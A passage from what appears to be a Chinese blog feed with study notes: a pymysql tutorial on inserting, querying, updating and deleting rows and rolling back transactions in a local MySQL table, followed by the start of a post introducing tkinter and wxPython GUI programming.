comment">#另一种插入数据的方式，通过字符串传入值</span>sql<span class="token operator">=</span><span class="token string">"insert into user values(%s,%s,%s)"</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'kongsh'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>select_db(“数据库名”) 可以用这种方式在数据库连接建立后指定数据库</p></blockquote><p>插入多条数据：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接，同时指定数据库</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span><span class="token comment">#另一种插入数据的方式，通过字符串传入值</span>sql<span class="token operator">=</span><span class="token string">"insert into user values(%s,%s,%s)"</span>insert<span class="token operator">=</span>cur<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'wen'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'tom'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'批量插入返回受影响的行数：'</span><span class="token punctuation">,</span>insert<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：批量插入多条sql语句采用的是executemany(sql,args)函数，返回受影响的行数。args参数是一个包含多个元组的列表，每个元组对应一条mysql中的一条数据。这里的%s不需要加引号，否则插入数据的数据会类型错误</p><h3 id="查询操作">查询操作:</h3><blockquote><p>使用execute()函数得到的只是受影响的行数，并不能真正拿到查询的内容。cursor对象还提供了3种提取数据的方法：fetchone、fetchmany、fetchall.。每个方法都会导致游标动，所以必须注意游标的位置。<br>cursor.fetchone():获取游标所在处的一行数据，返回元组，没有返回None<br>cursor.fetchmany(size):接受size行返回结果行。如果size大于返回的结果行的数量，则会返回cursor.arraysize条数据。<br>cursor. fetchall():接收全部的返回结果行。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    res<span class="token operator">=</span>cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment">#表示已经取完结果集</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：从execute()函数的查询结果中取数据，以元组的形式返回游标所在处的一条数据，如果游标所在处没有数据，将返回空元组，该数据执行一次，游标向下移动一个位置。fetchone()函数必须跟exceute()函数结合使用，并且在exceute()函数之后使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#fetchone()函数实例：</span><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user"</span><span class="token punctuation">)</span><span class="token comment">#取3条数据</span>resTuple<span class="token operator">=</span>cur<span class="token punctuation">.</span>fetchmany<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>resTuple<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> resTuple<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：从exceute()函数结果中获取游标所在处的size条数据，并以元组的形式返回，元组的每一个元素都也是一个由一行数据组成的元组，如果size大于有效的结果行数，将会返回cursor.arraysize条数据，但如果游标所在处没有数据，将返回空元组。查询几条数据，游标将会向下移动几个位置。fetmany()函数必须跟exceute()函数结合使用，并且在exceute()函数之后使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user"</span><span class="token punctuation">)</span><span class="token comment">#取所有数据</span>resTuple<span class="token operator">=</span>cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>resTuple<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'共%d条数据'</span><span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>resTuple<span class="token punctuation">)</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：获取游标所在处开始及以下所有的数据，并以元组的形式返回，元组的每一个元素都也是一个由一行数据组成的元组，如果游标所在处没有数据，将返回空元组。执行完这个方法后，游标将移动到数据库表的最后</p><h3 id="更新操作：">更新操作：</h3><h4 id="单条数据更新操作：">单条数据更新操作：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#更新一条数据</span>update<span class="token operator">=</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"update user set age=100 where name='kongsh'"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'修改后受影响的行数为：'</span><span class="token punctuation">,</span>update<span class="token punctuation">)</span><span class="token comment">#查询一条数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select * from user where name="kongsh";'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多条数据更新操作：">多条数据更新操作：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysqlconn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span><span class="token comment">#打开数据库连接</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user where name in ('kongsh','wen');"</span><span class="token punctuation">)</span><span class="token comment">#更新前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'更新前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token comment">#更新2条数据</span>sql<span class="token operator">=</span><span class="token string">"update user set age=%s where name=%s"</span>update<span class="token operator">=</span>cur<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token string">'kongsh'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string">'wen'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#更新2条数据后查询所有数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user where name in ('kongsh','wen');"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'更新后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="删除数据：">删除数据：</h3><h4 id="删除单条数据：">删除单条数据：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span><span class="token comment">#打开数据库连接</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#删除前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>      cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"delete from user where id=1"</span><span class="token punctuation">)</span><span class="token comment">#删除1条数据</span><span class="token comment">#删除后查询所有数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除多条数据：">删除多条数据：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#删除前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token comment">#删除2条数据</span>sql<span class="token operator">=</span><span class="token string">"delete from user where id=%s"</span>cur<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#删除后查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="事务回滚">事务回滚</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysqlconn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span><span class="token comment">#打开数据库连接</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#修改前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'修改前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"update user set name='xiaoxiaoxiaoxiaoren' where id=5"</span><span class="token punctuation">)</span><span class="token comment">#更新表中第1条数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#修改后查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'修改后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#回滚事务</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'回滚事务后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python的GUI编程和tkinter，Wxpython</title>
      <link href="/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/"/>
      <url>/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/</url>
      
        <content type="html"><![CDATA[<h1 id="Python的GUI编程和tkinter，Wxpython"><a href="#Python的GUI编程和tkinter，Wxpython" class="headerlink" title="Python的GUI编程和tkinter，Wxpython"></a>Python的GUI编程和tkinter，Wxpython</h1><blockquote><p>PythonGUI这个内容是我在课程论文准备之初临时去学的一些内容，起初我准备学下tkinter做我课程论文项目的前段显示，但是由于临时的一些变动，我最终是采用了Wxpython的方式进行的可视化。当然这两个库在本质上都属于PythonGul。</p></blockquote><p>[TOC]</p><h2 id="PythonGUI介绍："><a href="#PythonGUI介绍：" class="headerlink" title="PythonGUI介绍："></a>PythonGUI介绍：</h2><ul><li><strong>Tkinter：</strong> Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。</li><li><strong>wxPython：</strong>wxPython 是一款开源软件，是 Python 语言的一套优秀的 GUI 图形库，允许 Python 程序员很方便的创建完整的、功能健全的 GUI 用户界面。</li><li><strong>Jython：</strong>Jython 程序可以和 Java 无缝集成。除了一些标准模块，Jython 使用 Java 的模块。Jython 几乎拥有标准的Python 中不依赖于 C 语言的全部模块。比如，Jython 的用户界面将使用 Swing，AWT或者 SWT。Jython 可以被动态或静态地编译成 Java 字节码。</li></ul><h2 id="tkinter"><a href="#tkinter" class="headerlink" title="tkinter"></a>tkinter</h2><h3 id="根窗体root："><a href="#根窗体root：" class="headerlink" title="根窗体root："></a>根窗体root：</h3><p>根窗体是图像化应用程序的根控制器，是tkinter的底层控件的实例。当导入tkinter模块后，调用 Tk()方法可初始化一个根窗体实例 root ,用 title() 方法可设置其标题文字，用geometry()方法可以设置窗体的大小（以像素为单位）。将其置于主循环中，除非用户关闭，否则程序始终处于运行状态。执行该程序，一个窗体就呈现出来了。在这个主循环的根窗体中，可持续呈现中的其他可视化控件实例，监测事件的发生并执行相应的处理程序 </p><p>主窗口位置和大小通过，geometry(‘wxh ± y ± z’)方法进行设置，w为宽度，h为高度，x用于分隔高度和宽度，+x表示距离屏幕左边的距离，-x表示距离屏幕右边的距离，±y同理。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#代码实现：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'我的第一个Python窗体'</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'240x240'</span><span class="token punctuation">)</span> <span class="token comment"># 这里的乘号不是 * ，而是小写英文字母 x</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="GUI组件表："><a href="#GUI组件表：" class="headerlink" 